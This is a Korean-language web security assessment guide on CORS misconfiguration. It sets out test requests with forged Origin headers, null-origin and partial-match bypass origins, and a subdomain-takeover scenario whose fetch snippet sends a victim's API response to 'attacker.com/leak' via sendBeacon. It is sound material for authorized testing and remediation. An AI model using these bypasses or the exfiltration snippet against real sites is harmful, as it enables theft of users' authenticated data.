---
sidebar_position: 23
title: CORS 잘못된 설정
description: 웹 진단 - CORS 점검 절차, Origin 반사/null/부분매칭 우회, Allow-Credentials 결합, PoC HTML 양식
keywords: [CORS, Cross-Origin Resource Sharing, Access-Control-Allow-Origin, Allow-Credentials, null Origin, Origin Reflection, OWASP A02]
draft: false
---

# CORS 잘못된 설정
> 서버가 임의 Origin 으로부터의 크로스 도메인 요청을 허용하면, 다른 도메인에서 **인증된 사용자 API 응답** 을 그대로 읽어갈 수 있음.
> `Access-Control-Allow-Credentials: true` 와 결합되면 단일 결함만으로 개인정보 / 거래내역 / 토큰 탈취 등급 (Critical).

## 점검 개요

| 항목 | 내용 |
| :--- | :--- |
| **분류** | OWASP A02:2025 - Security Misconfiguration / KISA 보안 설정 |
| **CWE** | [CWE-942: Permissive Cross-domain Policy](https://cwe.mitre.org/data/definitions/942.html), [CWE-346: Origin Validation Error](https://cwe.mitre.org/data/definitions/346.html) |
| **영향도** | 🔴 (임의 Origin 반사 + `Allow-Credentials: true`) / 🟡 (단순 반사, 인증 없음) |
| **점검 난이도** | 하 (Origin 헤더 1회 변조로 탐지) / 중 (검증 우회 패턴) |
| **예상 점검 시간** | 30분 ~ 2시간 |

---

## 점검 목적

API 응답의 CORS 정책이 임의 Origin 의 요청을 허용하는지, 인증 쿠키 / `Authorization` 헤더가 동반된 요청까지 허용하는지 확인한다. 허용될 경우 공격자가 호스팅한 다른 도메인에서 `fetch(..., {credentials: 'include'})` 로 **피해자의 인증 세션을 그대로 사용** 해 API 응답 본문을 읽어갈 수 있음 → 개인정보 / 거래내역 / 토큰 탈취까지 직결.

> **다른 페이지와 영역 분리**
> - CSRF (변경 요청 위조) → `csrf.md`. 본 페이지는 **조회 응답 읽기** 가 주 (CORS 가 정확히 설정되어 있으면 다른 도메인은 응답 본문을 못 읽음)
> - JSONP 콜백 인젝션 → 한 줄 언급 (모던 환경에선 거의 안 보임)
> - WebSocket Origin 검증 → 한 줄 언급, 별도 점검 항목
> - `postMessage` Origin 검증 → DOM 측면, `xss.md` 와 일부 겹침

---

## 유형 구분

| 유형 | 핵심 |
| :--- | :--- |
| **Origin 반사 + `Allow-Credentials: true`** | 임팩트 최상위. 보낸 Origin 을 그대로 응답에 반사 |
| **`null` Origin 허용** | `<iframe sandbox>` / `file://` / data URI 출처 요청 |
| **부분 매칭 우회** | `startsWith` / `contains` / `endsWith` / regex 검증 우회 |
| **`*` 와일드카드 + 토큰 인증** | 쿠키는 차단되지만 SPA 토큰 응답 본문은 탈취 가능한 케이스 |
| **신뢰 서브도메인 인수 / XSS 결합** | `*.target.com` 허용 + 서브도메인 takeover/XSS 시 전체 API 노출 |

---

## 진단 절차

### Step 1. 진입점 식별

Burp 시퀀스에서 인증이 필요한 API (개인정보, 거래내역, 토큰 발급 등) 응답 헤더 확인:

```
Access-Control-Allow-Origin: ...
Access-Control-Allow-Credentials: ...
Vary: Origin
```

`Allow-Origin` 이 동적으로 (요청 Origin 에 따라) 바뀌면 1차 의심.

### Step 2. Origin 반사 / null 테스트

Burp Repeater 로 `Origin` 헤더를 임의 도메인으로 변조:

```http
GET /api/me HTTP/1.1
Host: <TARGET>
Origin: https://evil.com
Cookie: SESSION=<session>
```

응답 헤더 분석:

- `Access-Control-Allow-Origin: https://evil.com` → 임의 Origin 반사 (취약 후보)
- `Access-Control-Allow-Credentials: true` 동반 → Critical 후보
- `Allow-Origin` 이 정적 (`https://app.target.com` 고정) → 케이스 3 (부분 매칭 우회) 으로 진행

### Step 3. 검증 우회 패턴

기본 반사가 안 되면 케이스 3~5 의 부분 매칭 / null / 서브도메인 패턴 적용.

### Step 4. PoC HTML 작성 + 다른 도메인 호스팅

공격자가 호스팅한 페이지에서 `fetch` 호출로 실제 데이터 탈취 입증. Burp Repeater 의 헤더 변조만으로는 보고서의 영향 입증이 약하므로, **다른 origin 의 HTML 에서 실제 브라우저로 호출 결과** 까지 캡처.

---

## 페이로드 / 테스트 케이스

### 케이스 1: 임의 Origin 반사 + `Allow-Credentials: true`
**언제 쓰는지**: Step 2 첫 시도. CORS 결함 중 가장 흔하고 임팩트 큰 패턴.

**요청:**

```http
GET /api/me HTTP/1.1
Host: <TARGET>
Origin: https://evil.com
Cookie: SESSION=<victim_session>
```

**취약 응답:**

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com         ← Origin 그대로 반사
Access-Control-Allow-Credentials: true                 ← 인증 쿠키 응답 허용
Content-Type: application/json

{"id": 42, "email": "victim@example.com", ...}
```

**판정**: 두 헤더가 동시에 존재 + 임의 Origin 통과 → Critical. 공격자 도메인에서 fetch 호출 시 응답 본문을 그대로 읽어갈 수 있음.

### 케이스 2: `null` Origin 허용

**언제 쓰는지**: 케이스 1 이 안 되거나, 화이트리스트에 `null` 이 포함됐는지 점검할 때.

**요청:**

```http
GET /api/me HTTP/1.1
Host: <TARGET>
Origin: null
Cookie: SESSION=<victim_session>
```

**취약 응답:**

```http
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

**판정**: 응답 헤더가 위와 같이 나오면 공격자가 `<iframe sandbox>` 또는 `data:` URI 로 `null` Origin 요청을 보낼 수 있음 (케이스 1 과 동일한 데이터 탈취 가능).

> `null` Origin 은 `<iframe sandbox srcdoc>`, `file://` 스킴, `data:` 스킴 페이지 등에서 발생. 공격자가 임의로 만들 수 있으므로 화이트리스트에 `null` 추가는 절대 금지.

### 케이스 3: 부분 매칭 우회
**언제 쓰는지**: 케이스 1 의 임의 Origin 이 거부되지만, 화이트리스트 검증 로직이 단순 문자열 비교일 가능성을 점검할 때.

**시도 단계:**

```
1. Origin: https://target.com                       → 200 + Allow-Origin: https://target.com (정상)

2. Origin: https://target.com.evil.com              → 응답 반사되면 startsWith 우회 (취약)
   Origin: https://app.target.com.evil.com          ← target.com 이 부분 매칭되면 통과

3. Origin: https://eviltarget.com                   → 응답 반사되면 endsWith 우회 (취약)
   Origin: https://attacker-target.com

4. Origin: https://evil.com/target.com              → contains 우회 (Origin 에 경로 자체는 못 들어가지만, regex 가 contains 패턴이면 일부 환경 우회)

5. Origin: https://target_com.evil.com              → 정규식 . 가 모든 문자 매칭하면 우회
   (regex 가 .target\.com$ 인데 점 이스케이프 누락한 케이스)

6. Origin: http://target.com                        → 스킴 검증 누락 (HTTPS 만 허용해야 하는데 HTTP 도 통과)
```

**판정**: 위 변형 중 하나라도 `Allow-Origin` 에 반사 + `Allow-Credentials: true` 면 검증 로직 자체가 결함 — Critical. `startsWith` / `contains` / `endsWith` / 점 이스케이프 누락 regex 는 거의 100% 우회 가능.

### 케이스 4: `*` 와일드카드 + 토큰 인증
**언제 쓰는지**: 응답에 `Access-Control-Allow-Origin: *` 이 나오는 경우. 브라우저는 `*` + `credentials: 'include'` 조합에서 쿠키 전송을 거부하므로 케이스 1 처럼 즉시 Critical 은 아님.

**제한:**

- `*` + 쿠키 인증 → 브라우저 차단 (Fetch 스펙). 실제 탈취 불가
- `*` + `Authorization: Bearer` 헤더 인증 → 토큰이 localStorage/JS 메모리에 있으면 XSS 결합 시 같은 origin 에서 보내는 게 더 쉬움. 단, 인증 없이 응답되는 민감 엔드포인트가 있다면 그 자체가 결함

**판정**:

- `*` + 인증 쿠키 환경: 직접 탈취는 안 되지만 **모범사례 위반** 으로 Low ~ Medium 리포트 가능
- `*` + 인증 없이 민감 정보가 응답되는 엔드포인트: CORS 가 아니라 **인증 누락** 결함으로 별도 보고 (`authorization-idor.md` 참조)

> 일부 브라우저/구버전이나 `XMLHttpRequest` 의 옛 동작에서 예외가 있을 수 있으나, 모던 환경 기준으로는 `*` + Credentials 조합은 자동 차단으로 봐도 무방.

### 케이스 5: 신뢰 서브도메인 인수 / XSS 결합

**언제 쓰는지**: 응답이 `Access-Control-Allow-Origin: https://app.target.com` 같은 정확 매칭이라 위 케이스가 안 통할 때. 점검 범위 내 다른 서브도메인 결함과 결합.

**시나리오:**

```
1. Allow-Origin 화이트리스트: *.target.com (또는 정확 매칭 app.target.com)

2. 점검 범위에서 다음 중 하나 확인:
   - dev.target.com, old.target.com, staging.target.com 등 사용되지 않는 서브도메인 존재
   - 해당 서브도메인이 외부 SaaS (Heroku, GitHub Pages, S3 등) CNAME 인데 SaaS 측 리소스 미할당 → Subdomain Takeover
   - 또는 그 서브도메인에 Stored/Reflected XSS 존재

3. 인수한 서브도메인 또는 XSS 가 있는 서브도메인에서 fetch 호출:
   fetch('https://api.target.com/me', {credentials: 'include'})
     .then(r => r.text())
     .then(d => navigator.sendBeacon('https://attacker.com/leak', d));
```

**판정**: 신뢰 서브도메인 중 takeover 가능하거나 XSS 가 있는 곳을 발견하면 CORS 정책이 정확 매칭이라도 우회 가능 — 두 결함을 함께 보고.

### 그 외 — 한 줄 언급만
- **Pre-flight `OPTIONS` 캐싱 (`Access-Control-Max-Age: 86400`)** — 검증 변경이 즉시 반영 안 됨. 영향 제한적, 모범사례 위반으로 보조 보고
- **`Vary: Origin` 누락 + CDN 캐시** — 한 사용자의 응답이 다른 사용자에게 노출되는 캐시 오염. CDN 환경에선 우선순위 있음
- **JSONP 콜백 인젝션** — `?callback=alert(1)` → 응답이 그대로 JS 실행. 모던 환경에선 거의 안 보임
- **WebSocket Origin 검증 미흡** — `Sec-WebSocket-Origin` 검증 누락. 별도 점검 항목 (Cross-Site WebSocket Hijacking)
- **`postMessage` Origin 검증 누락** — DOM 측면. `xss.md` 와 일부 겹침

---

## 취약 판정 기준

다음 중 **하나라도** 해당하면 취약:

- [ ] 임의 Origin 반사 + `Access-Control-Allow-Credentials: true` (Critical)
- [ ] `Origin: null` 허용 + `Allow-Credentials: true`
- [ ] 부분 매칭 우회 (`target.com.evil.com`, `eviltarget.com` 등) 로 외부 Origin 통과
- [ ] 점 이스케이프 누락 regex (`.target\.com` 이 아닌 `target.com`) 로 우회 가능
- [ ] `Vary: Origin` 누락 + CDN 환경 (캐시 오염 가능성)
- [ ] 신뢰 서브도메인 중 takeover 가능하거나 XSS 가 있어 CORS 화이트리스트 우회

**오탐 주의:**

- [ ] `Allow-Origin` 이 외부로 나가도 `Allow-Credentials` 가 없으면 인증 데이터는 못 가져감 — 단, 인증 없이 응답되는 민감 정보가 있으면 그 자체가 결함 (CORS 아닌 인증 누락)
- [ ] `*` + 쿠키 인증 환경에서는 브라우저가 자동 차단 — 모범사례 위반으로 Low/Medium 보고
- [ ] 응답에 `Allow-Origin` 헤더가 아예 없으면 브라우저가 SOP 로 차단 — 안전 (이게 정상)
- [ ] Public API (의도된 공개 데이터) 에서 `*` 는 정상. 점검 전 정책 확인 필요

---

## 참고자료

- [OWASP - CORS Original Vulnerability](https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny)
- [OWASP Cheat Sheet - HTML5 Security](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html)
- [PortSwigger - Cross-origin resource sharing (CORS)](https://portswigger.net/web-security/cors)
- [PortSwigger - Exploiting CORS misconfigurations for Bitcoins and bounties](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)
- [PayloadsAllTheThings - CORS Misconfiguration](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration)
- [HackTricks - CORS - Misconfigurations & Bypass](https://book.hacktricks.xyz/pentesting-web/cors-bypass)
- [MDN - Cross-Origin Resource Sharing (CORS)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
- [Fetch Standard - CORS protocol](https://fetch.spec.whatwg.org/#http-cors-protocol)
